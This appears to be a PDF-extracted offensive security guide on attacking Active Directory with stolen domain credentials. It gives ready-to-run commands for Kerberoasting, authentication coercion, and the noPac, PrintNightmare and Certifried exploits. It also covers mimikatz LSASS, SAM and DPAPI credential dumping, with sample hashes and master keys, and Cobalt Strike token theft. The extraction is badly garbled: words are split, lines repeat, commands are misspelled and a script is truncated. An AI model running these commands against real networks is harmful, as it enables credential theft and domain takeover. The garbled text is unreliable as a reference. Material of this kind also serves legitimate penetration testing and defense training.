---
id: ckb-9fe74458d1b2
title: Pwning the Domain Series with Credentials
category: identity-and-access
format: guide
language: en
tags: [active-directory, credential-access, networking, password-security, python, windows]
license: NOASSERTION
added: 2026-10-04
classification:
  method: heuristic
  confidence: 0.69
---

WWW.HADESS.IO
HADESS
With Credentials
With Credentials
Pwning the Domain series:
Introduction
Welcome to the "Pwning the Domain: With Credentials" series, a comprehensive exploration into
the realm of Active Directory (AD) exploitation. In this series, we'll delve deep into the strategies,
techniques, and tools utilized by attackers to gain unauthorized access within enterprise
environments. Our journey begins with an examination of Domain Account exploitation, where
we'll uncover the vulnerabilities and weaknesses inherent in AD configurations.
Domain Account Enumeration
The foundation of any successful attack begins with thorough enumeration. We'll explore
powerful tools like BloodHound and PowerView, which enable attackers to map out AD
environments, identify trust relationships, and pinpoint potential attack paths. Additionally,
we'll delve into techniques like Kerberoasting, which exploits weaknesses in Kerberos
authentication to extract service account credentials.
Coercion Techniques
Next, we'll delve into Coercion techniques, leveraging vulnerabilities such as PetitPotam,
PrinterBug, ShadowCoerce, and DFSCoerce. These vulnerabilities allow attackers to manipulate
Windows protocols and services, ultimately leading to privilege escalation and domain
compromise. By exploiting SMB shares and other services, attackers can escalate their privileges
within the AD environment.
Vulnerabilities Exploitation
Our exploration continues with an in-depth look at various vulnerabilities ripe for exploitation
within AD environments. From PrivExchange to PrintNightmare and Certifried, we'll dissect
these vulnerabilities, understanding their mechanisms and how attackers leverage them to
compromise domain security.
Domain Admin Exploitation
Moving forward, we'll shift our focus to Domain Admin exploitation, where we'll explore
techniques such as dumping NTDS and performing DCSync attacks. These methods allow
attackers to extract sensitive information, including password hashes, and escalate their
privileges to gain control over the entire domain.
Local Administrator Escalation
Finally, we'll explore techniques for escalating privileges within individual systems, focusing on
extracting credentials from LSASS, SAM/LSA, and DPAPI. We'll also delve into token
manipulation techniques, enabling attackers to adjust token privileges and impersonate users,
ultimately gaining access to sensitive resources.
Throughout this series, we'll provide practical demonstrations and real-world scenarios to
illustrate each concept. By understanding the methodologies employed by attackers, defenders
can better safeguard their AD environments and mitigate the risk of unauthorized access and
compromise. Join us on this journey as we uncover the intricacies of "Pwning the Domain: With
Credentials."
To be the vanguard of cybersecurity, Hadess envisions a world where digital assets are safeguarded from malicious actors. We strive to create a secure digital ecosystem, where
 businesses and individuals can thrive with confidence, knowing that their data is protected. Through relentless innovation and unwavering dedication, we aim to establish Hadess as a
symbol of trust, resilience, and retribution in the fight against cyber threats.
Document info
To be the vanguard of cybersecurity, Hadess envisions a world where digital assets are
 safeguarded  from  malicious  actors.  We  strive  to  create  a  secure  digital  ecosystem,  wher
e businesse s an d individual s ca n thriv e wit h confidence , knowin g tha t thei r dat a i s protecte
d. Throu gh relentle ss innovati on a nd unwaveri ng dedicatio n, we a im to establi sh Hade ss a
s a symbol of trust, resilience, and retribution in the fight against cyber threats.
At Hadess, our mission is twofold: to unleash the power of white hat hacking in punishing black
 hat hackers and to fortify the digital defenses of our clients. We are committed to employing ou
r elite team of expert cybersecurity professionals to identify, neutralize, and bring to justice tho
se w ho se ek to explo it vulnerabilitie s. Simultaneousl y, we provi de comprehensi ve solutio ns
and services to protect our client's digital assets, ensuring their resilience against cyber attacks.
With an unwavering focus on integrity, innovation, and client satisfaction, we strive to be the guardian
of trust and security in the digital realm.
Security Researcher
Amir Gholizadeh (@arimaqz), Surya Dev Singh (@kryolite_secure)
HADESS
Table of Content
Domain Account
 Enumeration
BloodHound
 PowerView
 Kerberoasting
Coercion
PetitPotam
PrinterBug(MS-PRPN)
 ShadowCoerce(MS-FSRVP)
DFSCoerce(MS-DFSNM)
SMB share
Vulnerablities
PrivExchange
SamAccountName/NoPac
 PrintNightmare
Certifried
Domain Admin
Dump NTDS
DCSync
Local Administrator
Extract credentials
LSASS
SAM/LSA
 DPAPI
 Token manipulation
Adjust token privileges
Token impersonation
   Recovering default privileges set of Network
Service/Local Service accounts
The "Pwning the Domain: With Credentials" article series aims
 to  provide  a  comprehensive  overview  of  techniques  an
d tool s utilize d b y attacker s t o exploi t Activ e Directo
ry environment s. T he seri es is structur ed in to thr ee m
ain sectio ns, focus ing  on Dom ain Acco unt exploitati on, Domain
Admin exploitation, and Local Administrator escalation.
Domain Account Exploitation
In
this
section,
we
explore
various
techniques
for
 enumerating  and  exploiting  domain  accounts.  Tools  lik
e BloodHoun d an d PowerVie w ar e discussed , alon g wit h t
he exploitati on of Kerberoasti ng vulnerabilitie s. Additional
ly, coerc
ion techniq
ues s
uch
 as PetitPot
am, Printer
Bug, ShadowCoe rce,  and DFSCo erce  are exami ned, highlighting
vulnerabilities in Windows protocols and services.
Vulnerability Exploitation
The series delves into specific vulnerabilities that attackers
 leverage to compromise domain security. Techniques such a
s PrivExchange
, SamAccountName/NoPac
, PrintNightmar
e, a nd Certifri ed a re explor ed in detai l, providi ng insigh ts into
their mechanisms and impact on AD environments.
Domain Admin Exploitation
This section focuses on techniques for escalating privileges
 to  gain  Domain  Admin  access.  Methods  like  dumping  NTD
S an d performin g DCSyn c attack s ar e discussed , illustrati
ng how attackers can extract sensitive information and escalate
their privileges within the domain.
Local Administrator Escalation
Finally, the series addresses techniques for escalating
 privileges
 within
 individual
 systems.
 Topics
 includ
e extracting credentials from LSASS, SAM/LSA, and DPAPI,
as we ll as tok en manipulati on techniqu es li ke adjusti ng to
ken privile ges and impersonat ing use rs. Additional ly, met
hods for recovering default privileges set for Network Service and
Local Service accounts are explored.
By understanding these techniques and vulnerabilities,
 defenders  can  better  safeguard  their  AD  environment
s agains t unauthorize d acces s an d compromise . Throu
gh practic al demonstratio ns a nd real-wor ld scenario s,
the "Pwn ing the Doma in: W ith Credentia ls" ser ies a im
s to emp ower defen ders with  the knowl edge ne ede d to protect
their organizations from cyber threats.
Key Findings
The "Pwning the Domain: With Credentials" article series presents a comprehensive exploration of techniques used by
attackers to exploit Active Directory environments. Key findings include the significance of proper enumeration of domain
accounts using tools like BloodHound and PowerView, the exploitation of vulnerabilities such as Kerberoasting and
coercion techniques like PetitPotam and PrinterBug, which can lead to privilege escalation. Additionally, the series covers
specific vulnerabilities like PrivExchange, SamAccountName/NoPac, PrintNightmare, and Certifried, offering insights into
their exploitation and impact on domain security. Furthermore, techniques for escalating privileges to gain Domain Admin
access, such as dumping NTDS and performing DCSync attacks, are discussed, along with methods for escalating privileges
within individual systems, including extracting credentials from LSASS, SAM/LSA, and DPAPI, as well as token manipulation
techniques and recovering default privileges set for Network Service and Local Service accounts. Overall, the series aims to
empower defenders with the knowledge needed to protect their AD environments effectively.
Executive Summary
HADESS.IO
Pwning the Domain:  With Credential
The article series titled "Pwning the Domain: With Credentials" delves into the intricate world of Active
 Directory  (AD)  exploitation,  offering  a  comprehensive  examination  of  techniques  and  tools  utilized  b
y attackers to gain unauthorized access within enterprise environments. The series is structured into thr
ee ma in section s, ea ch focusi ng on differe nt aspec ts of credential-bas ed attack s: Doma in Account
Exploitation, Domain Admin Exploitation, and Local Administrator Escalation.
In the first section, Domain Account Exploitation, readers are introduced to various enumeration
 techniques, including the use of tools like BloodHound and PowerView. Additionally, the exploitation o
f vulnerabilitie s suc h a s Kerberoastin g an d coercio n technique s lik e PetitPota m an d PrinterBu g are
explored, shedding light on the weaknesses inherent in AD configurations.
Moving forward, the series delves into Domain Admin Exploitation, providing insights into techniques for
 escalating  privileges  and  gaining  control  over  the  entire  domain.  Methods  such  as  dumping  NTDS  an
d performing DCSync attacks are discussed, highlighting the critical role of proper privilege management
in securi ng AD environment s. Finall y, t he seri es address es Loc al Administrat or Escalatio n, cover
ing techniques for extracting credentials, manipulating tokens, and recovering default privileges, empowe
ring rea ders with  the knowl edge ne ede d to de fend aga inst credential-b ased att acks effectiv ely. Th
rough prac tical demonstra tion s and real- world scena rios , the "P wnin g the Do main:  With Credent ials"
series equips def ender s wi th the  too ls and stra tegies nec ess ary to saf eguard  their organiza tions' AD
environments from cyber threats.
Abstract
HADESS.IO
Pwning the Domain:  With Credential
Pwning the Domain
HADESS.IO
With Credentials
Attacks
01
After getting access to a domain account, there are a variety of things that can be done including but not
limited to: domain enumeration, Kerberoasting, coercion, etc.
Enumeration
There are many options for enumerating the domain once you have an account:
 BloodHound
 PowerView
 SharpView
..
BloodHound
BloodHound is a go-to tool when it comes to enumeration in the domain realm.
Domain Account
HADESS.IO
Pwning the Domain: With Credential
It uses graph theory to reveal relationships between objects in the domain realms and find complex attack paths that may
 otherwise  be  impossible  or  hard  to  find.  It’s  a  good  option  for  both  the  attackers,  to  abuse  those  paths,  and  for  the
defenders, to eliminate them.
BloodHound analyzes data and then shows a graph based on that data. To get the needed data we need data collection
 tools like SharpHound and/or AzureHound.
Usage guide
We’ll leave the installation to you: https://bloodhound.readthedocs.io/en/latest/https://bloodhound.readthedocs.io/en/latest/
4 because the newer version, 5, has some performance issues.
For this scenario we’ll be using SharpHound collector and you can get it from https://github.com/BloodHoundAD/SharpHound/releases/tag/v2.3.2
For this scenario we’ll be using SharpHound collector and you can get it from https://github.com/BloodHoundAD/SharpHound/releases/tag/v2.3.2
We’ll just go with no parameters and use the data it collected:
HADESS.IO
For the cheatsheet you can refer to the image below:
Pwning the Domain: With Credential
Then we simply need to upload it to where BloodHound is installed and drag the zip file into BloodHound GUI and wait for
it to upload.
HADESS.IO
You’ll probably get a lot more data since the lab this is tested on is installed recently. You can perform queries that are
implemented right into the BloodHound itself or write other queries yourself.
PowerView is part of the PowerSploit repository and is used for enumeration once inside the domain realm.
It includes many functions that are implemented using Win32 API and Powershell AD hooks.
You can get PowerView from this link.
Running it in the target system is as easy as uploading it there and importing it in Powershell:
Import-Module .\PowerView.ps1
There are many commands you can try out which are documented in the PowerSploit website.
We’ll be using some of the common ones here.
 Get-Domain: returns the domain object for the current (or specified) domain
PowerView
Pwning the Domain: With Credential
HADESS.IO
You can chain the results with select to only select the fields you want to see.
 Get-DomainComputer: returns all computers or specific computer objects in AD
 Get-DomainUser: return all users or specific user objects in AD
 Get-DomainGroup: return all groups or specific group objects in AD
Pwning the Domain: With Credential
Get-DomainGPO: returns all GPOs or specific GPO objects in AD
HADESS.IO
Get-NetShare: returns open shares on the local (or a remote) machine
When you have credentials, it means you authenticate against Kerberos where you provide your NTHash in AS_REQ packet
and receive a TGT(Ticket Granting Ticket) through AS_REP packet. Then you can use that TGT to send a TGS_REQ to get a
ST(Service Ticket) to access a specific service via TGS_REP packet.
This is where it gets interesting, that ST you got from the server is encrypted with the service account’s NTHash, meaning
when you get hold of a ST, you can crack it and get back the service account’s password!
That’s what Kerberoasting is all about.
Kerberoasting
Pwning the Domain: With Credential
HADESS.IO
With credentials
Once you have a username and password you can request STs for services that have their SPN(Service Principal Name)
set:
GetUserSPNs.py -request -dc-ip <ip> <domain>/<user>:<password>
Once you have the hash, you can crack it using hashcat.
With username
You can also request a ST using AS_REQ packet instead of TGS_REQ when you have a ASREPRoastable user and service
SPNs to target.
GetUserSPNs.py -no-preauth "bobby" -usersfile "services.txt" -dc-host "DC_IP_or_HOST" "DOMAIN.LOCAL"/
Targeted
If a user has the rights to add a SPN to another user, It’s possible to make the other user vulnerable to Keberoasting!
Coercion
Coercion is about forcing/redirecting authentications. And there are many ways to do it and Microsoft doesn’t really see it
as a vulnerability because it’s pretty common in the domain realm to relay authentication.
PrinterBug(MS-PRPN)
PrinterBug triggers a RPC call to make the victim’s Spooler service authenticate to a target of the attacker's choosing. And
it has no fix!
First you should check to see whether Spooler service is available or not using Impacket’s rpcdump.py:
Pwning the Domain: With Credential
HADESS.IO
Then you can easily use printerbug.py to coerce authentication to a target of your choosing:
Then you can easily use printerbug.py to coerce authentication to a target of your choosing:
ShadowCoerce(MS-FSRVP)
MS-FSRVP is used to create shadow copies of remote hosts. The requirement for this coercion method is that the File
Server VSS Agent Service must be installed on the target system. Note that this is patched in update kb5015527:
shadowcoerce.py -d "domain" -u "user" -p "password" LISTENER TARGET
DFSCoerce(MS-DFSNM)
MS-DFSNM provides a RPC interface for administering DFS:
dfscoerce.py -d "domain" -u "user" -p "password" LISTENER TARGET
SMB share
If you have access to a SMB share, you can put a variety of files in there to coerce authentication your way! You can put
.url,.scf,..
Pwning the Domain: With Credential
Vulnerabilities
PrivExchange Vulnerability
The PrivExchange attack involves leveraging vulnerabilities in Microsoft Exchange servers to escalate privileges and
ultimately gain domain administrator access. Below are the steps involved in conducting a PrivExchange attack:
Installation of Requirements:
Ensure impacket is installed. You can install it from pip with pip install impacket, but using the latest version from GitHub
is recommended.
Execute privexchange.py:
Use the privexchange.py tool to log in to Exchange Web Services and subscribe to push notifications. This action prompts
Exchange to connect back to the attacker and authenticate as the system.
Execute httpattack.py (Optional):
The httpattack.py module can be used with ntlmrelayx.py to perform the attack without credentials.
Modify the attacker URL in httpattack.py to point to the attacker's server where ntlmrelayx will run.
Clone the impacket repository from GitHub (git clone https://github.com/SecureAuthCorp/impacket) and copy the
httpattack.py file into the /impacket/impacket/examples/ntlmrelayx/attacks/ directory.
Install the modified version of impacket with pip install . --upgrade or pip install -e .
HADESS.IO
SamAccountName/NoPac Attack
The SamAccountName/NoPac attack exploits vulnerabilities CVE-2021-42278 and CVE-2021-42287 to impersonate a
Domain Admin from a standard domain user. Below are the key steps and commands involved in executing this attack:
Installation of Requirements:
1.
Ensure the necessary tools and libraries are installed, including Impacket. You can install Impacket from pip with
pip install impacket, or use the latest version from GitHub.
Execute noPac.py:
2.
Use the noPac.py script to perform the attack, providing the domain/username and password as parameters.
Example:
python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203
Auto Get Shell:
Optionally, use the --shell parameter to automatically drop a shell via smbexec after successful exploitation.
Example:
python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 -shell --impersonate
administrator
Pwning the Domain: With Credential
HADESS.IO
Dump Hash:
Use the -dump parameter to dump hashes after successful exploitation.
Example:
python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator
-dump
Scanner:
Utilize the scanner.py script to scan for vulnerable systems within the domain.
Example:
python scanner.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203
Additional Methods:
Optionally, you can explore additional methods for exploiting vulnerabilities, such as finding computers that can be
modified by the current user or identifying CreateChild accounts.
Examples:
AdFind.exe -sc getacls -sddlfilter ;;"[WRT PROP]";;computer;domain\user  -recmute
AdFind.exe -sc getacls -sddlfilter ;;"[CR CHILD]";;computer; -recmute
PrintNightmare Exploit (PowerShell)
PrintNightmare enables attackers to execute arbitrary code with SYSTEM privileges on a target system. Below is a
PowerShell script that leverages PrintNightmare to perform local privilege escalation:
# Import the PowerShell module
Import-Module .\cve-2021-1675.ps1
# Add a new user to the local administrators group by default
Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
# Supply a custom DLL payload
Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure"
Details:
The script embeds a Base64-encoded GZIPped payload for a custom DLL, allowing for local privilege escalation.
It does not require remote RPC or SMB access, as it operates solely within the functions of Print Spooler.
Methods from PowerSploit/PowerUp are utilized for reflective access to the Win32 APIs.
The script automatically determines the appropriate DLL path without iterating through all printer drivers.
Pwning the Domain: With Credential
HADESS.IO
Certifried Exploitation
Certifried simplifies the process of exploiting CVE-2022-26923. However, here are the manual steps to replicate the
vulnerability:
Request Certificate Manually:
1.
Add the computer and update necessary attributes.
python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10
Recover NTLM Hash:
Request the certificate manually.
python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 -use-ldap
Pwning the Domain: With Credential
LSASS DUMP
Local Security Authority Server Service (LSASS) is a process in Microsoft Windows
operating systems that is responsible for enforcing the security policy on the system.”
Basically, it stores the local usernames and passwords/hashes in it. So dumping this
is one of the common things adversary and red teamers do. Although there are
several ways to dump the lsass , but we will keep it limited to mimikatz.
if we have got access with credentials to domain controller or any other machine with
local administrative rights, we can run the mimikatz with following command to dump
the lsass process and extract NTLM hashes from it. The clear text password
dumping is possible on older version of windows where the wdigest
(https://blog.netwrix.com/2022/10/11/wdigest-clear-text-passwords-stealing-more-
than-a-hash/ ) is used. But the newer version of windows have wdigest disabled, so
we get NTLM hashes only.
privilege::elevete
sekurlsa::logonPasswords
HADESS.IO
Extract Credentials
The above command dump all the hashes from LSASS including the user accounts
that were not dumped in logon passwords before.
Do remember , there are several ways to dump the hashes from the lsass process ,
not limited to one, like we can use task manager to dump the lsass memory file, we
can use procdump , we can use msv module of mimikatz , etc.
SAM/LSA DUMP
The Security Account Manager (SAM) database holds the NTLM hashes of local
accounts only. These can be extracted with the lsadump::sam Mimikatz module. If a
common local administrator account is being used with the same password across
an entire environment, this can make it very trivial to move laterally.
Pwning the Domain: With Credential
HADESS.IO
privilege::debug
token::elevate
lsadump::sam
The above commands dumps the local Security Account Manager (SAM) NT hashes.
It can operate directly on the target system, or offline with registry hives backups (for
SAM and SYSTEM ).
Pwning the Domain: With Credential
mimikatz # lsadump::sam
Domain : DC
SysKey : 7852ea75b3b8c4093fbda3f618a045bb
Local SID : S-1-5-21-97532702-2134717100-614679475
SAMKey : 7a87c9ff42815d7d1cead9fe84db22ba
RID : 000001f4 (500)
User : Administrator
Hash NTLM: 4d01f91984530f183381bdf5f0605f63
RID : 000001f5 (501)
User : Guest
DPAPI Dump/Decryption
The Data Protection API (DPAPI) is a component built into Windows that provides a
means for encrypting and decrypting data "blobs". It uses cryptographic keys that
are tied to either a specific user or computer and allows both native Windows
functionality and third-party applications to protect/unprotect data transparently to the
user.
DPAPI is used by the Windows Credential Manager to store saved secrets such as
RDP credentials, and by third-party applications like Google Chrome to store website
credentials.
The way the Windows Credential Manager works on basis of "Vaults" and
"Credentials" . A "vault" essentially holds records of encrypted credentials and a
reference to the encrypted blobs. Windows has two vaults: Web Credentials (for
storing browser credentials) and Windows Credentials (for storing credentials saved
by mstsc, etc). A "credential" is the actual encrypted credential blob. we can use the
folloiwng command to list the valut
mimikatz vault::list
Now we have Credential Files , This files are protected and could be located in:
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden
C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden
C:\Users\username\AppData\Roaming\Microsoft\Credentials\
HADESS.IO
Get credentials info using mimikatz dpapi::cred , in the response you can find
interesting info such as the encrypted data and the guidMasterKey. The master keys
are stored in the users' roaming "Protect" directory. But they're also encrypted.
mimikatz dpapi::cred /in:C:\Users\
<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7
891A7
[...]
guidMasterKey : {bfc5090d-22fe-4058-8953-47f6882f549e}
[...]
pbData : b8f619[...snip...]b493fe
Now there are two ways to dump the master key, but here we will show you the first
method , i.e if the master keys are cached in LSASS. It will not be in the cache if the
user has not recently accessed/decrypted the credential.
Pwning the Domain: With Credential
mimikatz !sekurlsa::dpapi
Authentication Id : 0 ; 1075454 (00000000:001068fe)
Session : RemoteInteractive from 2
User Name : bfarmer
Domain : DEV
Logon Server : DC-2
Logon Time : 9/6/2022 9:09:54 AM
SID : S-1-5-21-569305411-121244042-2357301523-1104
[00000000]
* GUID : {bfc5090d-22fe-4058-8953-47f6882f549e}
* Time : 9/6/2022 11:27:44 AM
* MasterKey :
8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85f
c8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
* sha1(key) : 897f7bf129e6a898ff4e20e9789009d5385be1f3
as we can see we have the GUID match from the above both command , so that is
our master key. Now we can use mimikatz module dpapi::cred with the appropiate
/masterkey to decrypt and get a plain text password.
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
Adjust token privileges
Widows operating system follows the concept of ‘Token Privileges’. Now these aren’t
just privileges that Windows gives you to make you feel better - those are Token
Compliments. Token Privileges are aspects of the things your user account can do,
but you often don’t need that power enabled by default. For example, anybody can
restart a computer, but windows doesn’t enable that privilege by default:
Token Manipulation
HADESS.IO
do remember , domain group policy overrides the privileges and access we set
on local system
if we want to enable or disable token privileges , PowerShell doesn’t ship a cmdlet to
adjust token privileges by default. There are two ways to adjust the token privileges
either by using windows API called AdjustTokenPrivileges
(https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-
securitybaseapi-adjusttokenprivileges ).
or we can use the following PowerShell script that uses pinvoke to enable / disables
the all/any privilges.
param( ## The privilege to adjust. This set is taken from
## http://msdn.microsoft.com/en-us/library/bb530716(VS.85).aspx
[ValidateSet(
"SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege",
"SeBackupPrivilege",
"SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
"SeCreatePagefilePrivilege",
"SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege",
"SeCreateTokenPrivilege",
"SeDebugPrivilege", "SeEnableDelegationPrivilege",
"SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
"SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege",
"SeLoadDriverPrivilege",
"SeLockMemoryPrivilege", "SeMachineAccountPrivilege",
"SeManageVolumePrivilege",
"SeProfileSingleProcessPrivilege", "SeRelabelPrivilege",
"SeRemoteShutdownPrivilege",
"SeRestorePrivilege", "SeSecurityPrivilege",
"SeShutdownPrivilege", "SeSyncAgentPrivilege",
"SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege",
"SeSystemtimePrivilege",
"SeTakeOwnershipPrivilege", "SeTcbPrivilege",
"SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
"SeUndockPrivilege", "SeUnsolicitedInputPrivilege")]
$Privilege,
## The process on which to adjust the privilege. Defaults to the
current process.
$ProcessId = $pid,
## Switch to disable the privilege, rather than enable it.
$Disable
)
## Taken from P/Invoke.NET with minor adjustments.
$definition = @'
using System;
using System.Runtime.InteropServices;
public class AdjPriv
{
[DllImport("advapi32.dll",
Pwning the Domain: With Credential
HADESS.IO
Token Impersonation
Here an adversary creates a new access token that duplicates an existing token
using DuplicateToken(Ex). The token can than be used with
ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on
user's security context, or with SetThreatToken to assign the impersonated token a
thread. This is useful for when the target user has a non-network logon session on
the system.
To use the impersonation , we can use incognito from meterpreter or steal_token or
make_token from the Cobalt strike.
Incognito can be loaded into a Meterpreter session by using the “use incognito”
command, and available tokens can be listed with “list_tokens -u”. if we have any
impersonation token available , we can use it like so :
Pwning the Domain: With Credential
also in cobalt strike , we if we know the plaintext password of the user we can create
an token for that user to abuse it like so :
beacon> make_token DEV\suryadevsingh Qwerty123
[+] Impersonated DEV\jking (netonly)
beacon> remote-exec winrm <ip/doamin> whoami
dev\suryadevsingh
or we can steal the token from the PID , if we are having higher privileges of local
administrator :
beacon> steal_token 5536
Recovering default privileges set of Network
Service/Local Service accounts / Bypassing Restricted
set of privileges.
On Windows, some services executed as LOCAL SERVICE or NETWORK SERVICE are
configured to run with a restricted set of privileges. Therefore, even if the service
is compromised, you won't get the golden impersonation privileges and privilege
escalation to LOCAL SYSTEM should be more complicated. However, when you create
a scheduled task, the new process created by the Task Scheduler Service has all
the default privileges of the associated user account (except SeImpersonate).
Therefore, with some token manipulations, you can spawn a new process with all the
missing privileges.
HADESS.IO
We can utilize the tool called FullPowers to achive this . This tool should be
executed as LOCAL SERVICE or NETWORK SERVICE only.
c:\TOOLS>FullPowers -c "powershell -ep Bypass"
[+] Successfully created scheduled task. PID=9028
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Try the new cross-platform PowerShell https://aka.ms/pscore6
PS C:\WINDOWS\system32> Get-ExecutionPolicy
Bypass
Pwning the Domain: With Credential
Conclusion
In conclusion, the "Pwning the Domain: With Credentials" article
series provides a comprehensive understanding of the techniques
and
vulnerabilities
involved
in
exploiting
Active
Directory
environments. By delving into the intricacies of domain account
enumeration, domain admin exploitation, and local administrator
escalation, readers have gained valuable insights into the methods
employed by attackers to compromise AD security. Through practical
demonstrations and in-depth discussions, the series has equipped
defenders with the knowledge needed to mitigate the risks posed by
credential-based attacks effectively.
As organizations continue to face evolving cyber threats, it is crucial
to implement robust security measures to protect AD environments.
By staying informed about the latest vulnerabilities and adopting
proactive defense strategies, organizations can effectively defend
against credential-based attacks and safeguard their sensitive data.
The "Pwning the Domain: With Credentials" series serves as a valuable
resource for security professionals, enabling them to stay ahead of
emerging threats and secure their AD infrastructures against
potential breaches.
"Hadess" is a cybersecurity company focused on safeguarding digital assets
and creating a secure digital ecosystem. Our mission involves punishing hackers
and fortifying clients' defenses through innovation and expert cybersecurity
services.
HADESS
cat ~/.hadess
Email
MARKETING@HADESS.IO
Website:
WWW.HADESS.IO
To be the vanguard of cybersecurity, Hadess envisions a world where digital assets are safeguarded from malicious actors. We strive to create a secure digital ecosystem, where
businesses and individuals can thrive with confidence, knowing that their data is protected. Through relentless innovation and unwavering dedication, we aim to establish Hadess as a
symbol of trust, resilience, and retribution in the fight against cyber threats.
